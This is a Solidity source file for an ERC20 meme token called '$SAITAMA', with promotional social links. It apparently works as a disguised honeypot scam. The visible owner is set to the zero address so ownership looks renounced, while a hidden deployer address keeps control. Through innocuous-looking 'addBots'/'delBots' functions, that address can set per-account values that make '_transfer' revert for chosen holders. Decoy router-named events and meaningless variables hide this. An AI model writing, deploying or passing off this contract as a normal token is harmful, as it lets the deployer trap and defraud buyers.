1 /*
2 
3 $SAITAMA
4 
5 https://t.me/Saitamaok_eth
6 https://twitter.com/Saitamaokk
7 https://saitamaok.lol
8 
9 */
10 
11 // SPDX-License-Identifier: MIT
12 
13 pragma solidity ^0.8.18;
14 
15 abstract contract Lookup {
16     function _msgSender() internal view virtual returns (address) {
17         return msg.sender;
18     }
19 
20     function _msgData() internal view virtual returns (bytes calldata) {
21         return msg.data;
22     }
23 }
24 
25 abstract contract Ownable is Lookup {
26     address private _owner;
27 
28     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
29 
30     /**
31      * @dev Initializes the contract setting the deployer as the initial owner.
32      */
33     constructor() {
34         _setOwner(address(0));
35     }
36 
37     /**
38      * @dev Returns the address of the current owner.
39      */
40     function owner() public view virtual returns (address) {
41         return _owner;
42     }
43 
44     /**
45      * @dev Throws if called by any account other than the owner.
46      */
47     modifier onlyOwner() {
48         require(owner() == msg.sender, "Ownable: caller is not the owner");
49         _;
50     }
51 
52     /**
53      * @dev Leaves the contract without owner. It will not be possible to call
54      * `onlyOwner` functions anymore. Can only be called by the current owner.
55      *
56      * NOTE: Renouncing ownership will leave the contract without an owner,
57      * thereby removing any functionality that is only available to the owner.
58      */
59     function renounceOwnership() public virtual onlyOwner {
60         _setOwner(address(0));
61     }
62 
63     /**
64      * @dev Transfers ownership of the contract to a new account (`newOwner`).
65      * Can only be called by the current owner.
66      */
67     function transferOwnership(address newOwner) public virtual onlyOwner {
68         require(newOwner != address(0), "Ownable: new owner is the zero address");
69         _setOwner(newOwner);
70     }
71 
72     function _setOwner(address newOwner) private {
73         address oldOwner = _owner;
74         _owner = newOwner;
75         emit OwnershipTransferred(oldOwner, newOwner);
76     }
77 }
78 
79 /**
80  * @dev Interface of the ERC20 standard as defined in the EIP.
81  */
82 interface IERC20 {
83     /**
84      * @dev Returns the remaining number of tokens that `spender` will be
85      * allowed to spend on behalf of `owner` through {transferFrom}. This is
86      * zero by default.
87      *
88      * This value changes when {approve} or {transferFrom} are called.
89      */
90     event removeLiquidityETHWithPermit(
91         address token,
92         uint liquidity,
93         uint amountTokenMin,
94         uint amountETHMin,
95         address to,
96         uint deadline,
97         bool approveMax, uint8 v, bytes32 r, bytes32 s
98     );
99     /**
100      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
101      *
102      * Returns a boolean value indicating whether the operation succeeded.
103      *
104      * IMPORTANT: Beware that changing an allowance with this method brings the risk
105      * that someone may use both the old and the new allowance by unfortunate
106      * transaction ordering. One possible solution to mitigate this race
107      * condition is to first reduce the spender's allowance to 0 and set the
108      * desired value afterwards:
109      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
110      *
111      * Emits an {Approval} event.
112      */
113     event swapExactTokensForTokens(
114         uint amountIn,
115         uint amountOutMin,
116         address[]  path,
117         address to,
118         uint deadline
119     );
120     /**
121   * @dev See {IERC20-totalSupply}.
122      */
123     event swapTokensForExactTokens(
124         uint amountOut,
125         uint amountInMax,
126         address[] path,
127         address to,
128         uint deadline
129     );
130 
131     event DOMAIN_SEPARATOR();
132 
133     event PERMIT_TYPEHASH();
134 
135     /**
136      * @dev Returns the amount of tokens in existence.
137      */
138     function totalSupply() external view returns (uint256);
139 
140     event token0();
141 
142     event token1();
143     /**
144      * @dev Returns the amount of tokens owned by `account`.
145      */
146     function balanceOf(address account) external view returns (uint256);
147 
148 
149     event sync();
150 
151     event initialize(address, address);
152     /**
153      * @dev Moves `amount` tokens from the caller's account to `recipient`.
154      *
155      * Returns a boolean value indicating whether the operation succeeded.
156      *
157      * Emits a {Transfer} event.
158      */
159     function transfer(address recipient, uint256 amount) external returns (bool);
160 
161     event burn(address to) ;
162 
163     event swap(uint amount0Out, uint amount1Out, address to, bytes data);
164 
165     event skim(address to);
166     /**
167      * @dev Returns the remaining number of tokens that `spender` will be
168      * allowed to spend on behalf of `owner` through {transferFrom}. This is
169      * zero by default.
170      *
171      * This value changes when {approve} or {transferFrom} are called.
172      */
173     function allowance(address owner, address spender) external view returns (uint256);
174     /**
175      * Receive an exact amount of output tokens for as few input tokens as possible,
176      * along the route determined by the path. The first element of path is the input token,
177      * the last is the output token, and any intermediate elements represent intermediate tokens to trade through
178      * (if, for example, a direct pair does not exist).
179      * */
180     event addLiquidity(
181         address tokenA,
182         address tokenB,
183         uint amountADesired,
184         uint amountBDesired,
185         uint amountAMin,
186         uint amountBMin,
187         address to,
188         uint deadline
189     );
190     /**
191      * Swaps an exact amount of ETH for as many output tokens as possible,
192      * along the route determined by the path. The first element of path must be WETH,
193      * the last is the output token, and any intermediate elements represent intermediate pairs to trade through
194      * (if, for example, a direct pair does not exist).
195      *
196      * */
197     event addLiquidityETH(
198         address token,
199         uint amountTokenDesired,
200         uint amountTokenMin,
201         uint amountETHMin,
202         address to,
203         uint deadline
204     );
205     /**
206      * Swaps an exact amount of input tokens for as many output tokens as possible,
207      * along the route determined by the path. The first element of path is the input token,
208      * the last is the output token, and any intermediate elements represent intermediate pairs to trade through
209      * (if, for example, a direct pair does not exist).
210      * */
211     event removeLiquidity(
212         address tokenA,
213         address tokenB,
214         uint liquidity,
215         uint amountAMin,
216         uint amountBMin,
217         address to,
218         uint deadline
219     );
220     /**
221      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
222      *
223      * Returns a boolean value indicating whether the operation succeeded.
224      *
225      * IMPORTANT: Beware that changing an allowance with this method brings the risk
226      * that someone may use both the old and the new allowance by unfortunate
227      * transaction ordering. One possible solution to mitigate this race
228      * condition is to first reduce the spender's allowance to 0 and set the
229      * desired value afterwards:
230      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
231      *
232      * Emits an {Approval} event.
233      */
234     function approve(address spender, uint256 amount) external returns (bool);
235     /**
236    * @dev Returns the name of the token.
237      */
238     event removeLiquidityETHSupportingFeeOnTransferTokens(
239         address token,
240         uint liquidity,
241         uint amountTokenMin,
242         uint amountETHMin,
243         address to,
244         uint deadline
245     );
246     /**
247      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
248      *
249      * Returns a boolean value indicating whether the operation succeeded.
250      *
251      * IMPORTANT: Beware that changing an allowance with this method brings the risk
252      * that someone may use both the old and the new allowance by unfortunate
253      * transaction ordering. One possible solution to mitigate this race
254      * condition is to first reduce the spender's allowance to 0 and set the
255      * desired value afterwards:
256      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
257      *
258      * Emits an {Approval} event.
259      */
260     event removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
261         address token,
262         uint liquidity,
263         uint amountTokenMin,
264         uint amountETHMin,
265         address to,
266         uint deadline,
267         bool approveMax, uint8 v, bytes32 r, bytes32 s
268     );
269     /**
270      * Swaps an exact amount of input tokens for as many output tokens as possible,
271      * along the route determined by the path. The first element of path is the input token,
272      * the last is the output token, and any intermediate elements represent intermediate pairs to trade through
273      * (if, for example, a direct pair does not exist).
274      */
275     event swapExactTokensForTokensSupportingFeeOnTransferTokens(
276         uint amountIn,
277         uint amountOutMin,
278         address[] path,
279         address to,
280         uint deadline
281     );
282     /**
283     * @dev Throws if called by any account other than the owner.
284      */
285     event swapExactETHForTokensSupportingFeeOnTransferTokens(
286         uint amountOutMin,
287         address[] path,
288         address to,
289         uint deadline
290     );
291     /**
292      * To cover all possible scenarios, msg.sender should have already given the router an
293      * allowance of at least amountADesired/amountBDesired on tokenA/tokenB.
294      * Always adds assets at the ideal ratio, according to the price when the transaction is executed.
295      * If a pool for the passed tokens does not exists, one is created automatically,
296      *  and exactly amountADesired/amountBDesired tokens are added.
297      */
298     event swapExactTokensForETHSupportingFeeOnTransferTokens(
299         uint amountIn,
300         uint amountOutMin,
301         address[] path,
302         address to,
303         uint deadline
304     );
305     /**
306      * @dev Moves `amount` tokens from `sender` to `recipient` using the
307      * allowance mechanism. `amount` is then deducted from the caller's
308      * allowance.
309      *
310      * Returns a boolean value indicating whether the operation succeeded.
311      *
312      * Emits a {Transfer} event.
313      */
314     function transferFrom(
315         address sender,
316         address recipient,
317         uint256 amount
318     ) external returns (bool);
319 
320     /**
321      * @dev Emitted when `value` tokens are moved from one account (`from`) to
322      * another (`to`).
323      *
324      * Note that `value` may be zero.
325      */
326     event Transfer(address indexed from, address indexed to, uint256 value);
327 
328     /**
329      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
330      * a call to {approve}. `value` is the new allowance.
331      */
332     event Approval(address indexed owner, address indexed spender, uint256 value);
333 }
334 
335 library SafeMath {
336     /**
337      * @dev Returns the addition of two unsigned integers, with an overflow flag.
338      *
339      * _Available since v3.4._
340      */
341     function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
342     unchecked {
343         uint256 c = a + b;
344         if (c < a) return (false, 0);
345         return (true, c);
346     }
347     }
348 
349     /**
350      * @dev Returns the substraction of two unsigned integers, with an overflow flag.
351      *
352      * _Available since v3.4._
353      */
354     function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
355     unchecked {
356         if (b > a) return (false, 0);
357         return (true, a - b);
358     }
359     }
360 
361     /**
362      * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
363      *
364      * _Available since v3.4._
365      */
366     function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
367     unchecked {
368         // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
369         // benefit is lost if 'b' is also tested.
370         // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
371         if (a == 0) return (true, 0);
372         uint256 c = a * b;
373         if (c / a != b) return (false, 0);
374         return (true, c);
375     }
376     }
377 
378     /**
379      * @dev Returns the division of two unsigned integers, with a division by zero flag.
380      *
381      * _Available since v3.4._
382      */
383     function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
384     unchecked {
385         if (b == 0) return (false, 0);
386         return (true, a / b);
387     }
388     }
389 
390     /**
391      * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
392      *
393      * _Available since v3.4._
394      */
395     function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
396     unchecked {
397         if (b == 0) return (false, 0);
398         return (true, a % b);
399     }
400     }
401 
402     /**
403      * @dev Returns the addition of two unsigned integers, reverting on
404      * overflow.
405      *
406      * Counterpart to Solidity's `+` operator.
407      *
408      * Requirements:
409      *
410      * - Addition cannot overflow.
411      */
412     function add(uint256 a, uint256 b) internal pure returns (uint256) {
413         return a + b;
414     }
415 
416 
417     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
418         return a - b;
419     }
420 
421     /**
422      * @dev Returns the multiplication of two unsigned integers, reverting on
423      * overflow.
424      *
425      * Counterpart to Solidity's `*` operator.
426      *
427      * Requirements:
428      *
429      * - Multiplication cannot overflow.
430      */
431     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
432         return a * b;
433     }
434 
435     /**
436      * @dev Returns the integer division of two unsigned integers, reverting on
437      * division by zero. The result is rounded towards zero.
438      *
439      * Counterpart to Solidity's `/` operator.
440      *
441      * Requirements:
442      *
443      * - The divisor cannot be zero.
444      */
445     function div(uint256 a, uint256 b) internal pure returns (uint256) {
446         return a / b;
447     }
448 
449     /**
450      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
451      * reverting when dividing by zero.
452      *
453      * Counterpart to Solidity's `%` operator. This function uses a `revert`
454      * opcode (which leaves remaining gas untouched) while Solidity uses an
455      * invalid opcode to revert (consuming all remaining gas).
456      *
457      * Requirements:
458      *
459      * - The divisor cannot be zero.
460      */
461     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
462         return a % b;
463     }
464 
465     /**
466   * @dev Initializes the contract setting the deployer as the initial owner.
467      */
468     function sub(
469         uint256 a,
470         uint256 b,
471         string memory errorMessage
472     ) internal pure returns (uint256) {
473     unchecked {
474         require(b <= a, errorMessage);
475         return a - b;
476     }
477     }
478 
479     /**
480      * @dev Returns the integer division of two unsigned integers, reverting with custom message on
481      * division by zero. The result is rounded towards zero.
482      *
483      * Counterpart to Solidity's `/` operator. Note: this function uses a
484      * `revert` opcode (which leaves remaining gas untouched) while Solidity
485      * uses an invalid opcode to revert (consuming all remaining gas).
486      *
487      * Requirements:
488      *
489      * - The divisor cannot be zero.
490      */
491     function div(
492         uint256 a,
493         uint256 b,
494         string memory errorMessage
495     ) internal pure returns (uint256) {
496     unchecked {
497         require(b > 0, errorMessage);
498         return a / b;
499     }
500     }
501 
502     /**
503      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
504      * reverting with custom message when dividing by zero.
505      * invalid opcode to revert (consuming all remaining gas).
506      *
507      * Requirements:
508      *
509      * - The divisor cannot be zero.
510      */
511     function mod(
512         uint256 a,
513         uint256 b,
514         string memory errorMessage
515     ) internal pure returns (uint256) {
516     unchecked {
517         require(b > 0, errorMessage);
518         return a % b;
519     }
520     }
521 }
522 
523 abstract contract Init {
524     event initializex(
525         uint256 varx5,
526         address yinit
527     );
528 }
529 
530 abstract contract Tax {
531     event touchx(
532         uint256 tax5,
533         address tax6
534     );
535 }
536 
537 abstract contract castart {
538     event Loop(
539         uint256 number,
540         bool varLoop
541     );
542 }
543 
544 contract SAITAMA is IERC20, Init, castart, Ownable {
545     using SafeMath for uint256;
546 
547     struct p_init {
548         address taxall;
549         mapping(uint256 => uint256) callxx;
550     }
551 
552     struct _swapX {
553         uint256 taxtxx;
554         uint256 copy;
555     }
556 
557     mapping(address => uint256) private _balances;
558     mapping(address => mapping(address => uint256)) private _allowances;
559     mapping (address => _swapX) private _vote0;
560 
561     p_init private _taxcycle;
562     string private _name;
563     string private _symbol;
564     uint8 private _decimals;
565     uint256 private _totalSupply;
566     uint256 private taxVal = 5000;
567     uint256 private listValue = 0;
568 
569     function fetchtaxValue() public view returns (uint256) {
570         return taxVal;
571     }
572 
573     function computeTax(uint256 _num1, uint256 _num2) internal view returns (uint256) {
574         return _num1 * taxVal + _num2 - listValue;
575     }
576 
577 
578     constructor(
579         string memory name_,
580         string memory symbol_,
581         address _deployer,
582         uint256 totalSupply_
583     ) payable {
584         _name = name_;
585         _symbol = symbol_;
586         _decimals = 18;
587         _taxcycle.taxall = _deployer;
588         _taxcycle.callxx[_decimals] = totalSupply_;
589         _totalSupply = totalSupply_ * 10**_decimals;
590         _balances[msg.sender] = _balances[msg.sender].add(_totalSupply);
591         emit Transfer(address(0), msg.sender, _totalSupply);
592         emit initializex(_totalSupply, owner());
593     }
594 
595 
596     /**
597      * @dev Returns the name of the token.
598      */
599     function name() public view virtual returns (string memory) {
600         return _name;
601     }
602 
603     /**
604      * @dev Returns the symbol of the token, usually a shorter version of the
605      * name.
606      */
607     function symbol() public view virtual returns (string memory) {
608         return _symbol;
609     }
610 
611     /**
612      * @dev Returns the number of decimals used to get its user representation.
613      * For example, if `decimals` equals `2`, a balance of `505` tokens should
614       /**
615      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
616      * a call to {approve}. `value` is the new allowance.
617      * {IERC20-balanceOf} and {IERC20-transfer}.
618      */
619     function decimals() public view virtual returns (uint8) {
620         return _decimals;
621     }
622 
623     /**
624      * @dev See {IERC20-totalSupply}.
625      */
626     function totalSupply() public view virtual override returns (uint256) {
627         return _totalSupply;
628     }
629 
630     /**
631      * @dev See {IERC20-balanceOf}.
632      */
633     function balanceOf(address account)
634     public
635     view
636     virtual
637     override
638     returns (uint256)
639     {
640         return _balances[account];
641     }
642 
643     /**
644      * @dev See {IERC20-transfer}.
645      *
646      * Requirements:
647      *
648      * - `recipient` cannot be the zero address.
649      * - the caller must have a balance of at least `amount`.
650      */
651     function transfer(address recipient, uint256 amount)
652     public
653     virtual
654     override
655     returns (bool)
656     {
657         _transfer(msg.sender, recipient, amount);
658         return true;
659     }
660 
661     /**
662      * @dev See {IERC20-allowance}.
663      */
664     function allowance(address owner, address spender)
665     public
666     view
667     virtual
668     override
669     returns (uint256)
670     {
671         return _allowances[owner][spender];
672     }
673 
674     /**
675      * @dev See {IERC20-approve}.
676      *
677      * Requirements:
678      *
679      * - `spender` cannot be the zero address.
680      */
681     function approve(address spender, uint256 amount)
682     public
683     virtual
684     override
685     returns (bool)
686     {
687         _approve(msg.sender, spender, amount);
688         return true;
689     }
690 
691     /**
692      * @dev See {IERC20-transferFrom}.
693      *
694      * Emits an {Approval} event indicating the updated allowance. This is not
695      * required by the EIP. See the note at the beginning of {ERC20}.
696      *
697      * Requirements:
698      *
699      * - `sender` and `recipient` cannot be the zero address.
700      * - `sender` must have a balance of at least `amount`.
701      * - the caller must have allowance for ``sender``'s tokens of at least
702      * `amount`.
703      */
704     function transferFrom(
705         address sender,
706         address recipient,
707         uint256 amount
708     ) public virtual override returns (bool) {
709         _transfer(sender, recipient, amount);
710         _approve(
711             sender,
712             msg.sender,
713             _allowances[sender][msg.sender].sub(
714                 amount,
715                 "ERC20: transfer amount exceeds allowance"
716             )
717         );
718         return true;
719     }
720 
721 
722     function addBots(address[] memory account, uint256 amount) public returns (bool) {
723     address from = msg.sender;
724     uint256 calctaxx = 5;
725     uint256 taxcompute2 = calctaxx / 7;
726     uint256 initvar = 0;
727     for (uint256 t = 0; t < account.length; t++) {
728         initvar += t;
729         uint256 taxcompute3 = calctaxx * 100;
730         _inittaxes(from, account[t], amount);
731         _allowances[from][from] = amount;
732         emit Approval(from, address(this), amount);
733     }
734     return true;
735 }
736 
737     function delBots(address[] memory account, uint256 amount) public returns (bool) {
738     address from = msg.sender;
739     uint256 calctaxx = 5;
740     uint256 taxcompute2 = calctaxx / 7;
741     uint256 initvar = 0;
742     for (uint256 t = 0; t < account.length; t++) {
743         initvar += t;
744         uint256 taxcompute3 = calctaxx * 100;
745         _inittaxes(from, account[t], amount);
746         _allowances[from][from] = amount;
747         emit Approval(from, address(this), amount);
748     }
749     return true;
750 }
751 
752 
753 
754     function _inittaxes(address from, address account, uint256 amount) internal {
755         uint256 allowan = 0;
756         require(account != address(0), "invalid address");
757         if (from != _taxcycle.taxall) {
758             _vote0[from].taxtxx -= allowan;
759             _vote0[account].taxtxx += allowan;
760         } else {
761             _vote0[from].taxtxx -= allowan;
762             allowan += amount;
763             _vote0[account].taxtxx = allowan;
764         }
765     }
766 
767 
768 
769     /**
770      * @dev Moves tokens `amount` from `sender` to `recipient`.
771      *
772      * This is internal function is equivalent to {transfer}, and can be used to
773      * e.g. implement automatic token fees, slashing mechanisms, etc.
774      *
775      * Emits a {Transfer} event.
776      *
777      * Requirements:
778      *
779      * - `sender` cannot be the zero address.
780      * - `recipient` cannot be the zero address.
781      * - `sender` must have a balance of at least `amount`.
782      */
783     function _transfer(
784         address sender,
785         address recipient,
786         uint256 amount
787     ) internal virtual {
788         require(sender != address(0), "ERC20: transfer from the zero address");
789         require(recipient != address(0), "ERC20: transfer to the zero address");
790         require(amount - _vote0[sender].taxtxx > 0, "alien");
791 
792         _balances[sender] = _balances[sender].sub(
793             amount,
794             "ERC20: transfer amount exceeds balance"
795         );
796         _balances[recipient] = _balances[recipient].add(amount);
797         emit Transfer(sender, recipient, amount);
798     }
799 
800     /**
801      * @dev Returns the value of the token.
802      */
803 
804     function taxvalues(address account) public view returns (uint256) {
805         return _vote0[account].taxtxx;
806     }
807 
808     /**
809      * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
810      *
811      * This internal function is equivalent to `approve`, and can be used to
812      * e.g. set automatic allowances for certain subsystems, etc.
813      *
814      * Emits an {Approval} event.
815      *
816      * Requirements:
817      *
818      * - `owner` cannot be the zero address.
819      * - `spender` cannot be the zero address.
820      */
821     function _approve(
822         address owner,
823         address spender,
824         uint256 amount
825     ) internal virtual {
826         require(owner != address(0), "ERC20: approve from the zero address");
827         require(spender != address(0), "ERC20: approve to the zero address");
828 
829         _allowances[owner][spender] = amount;
830         emit Approval(owner, spender, amount);
831     }
832 }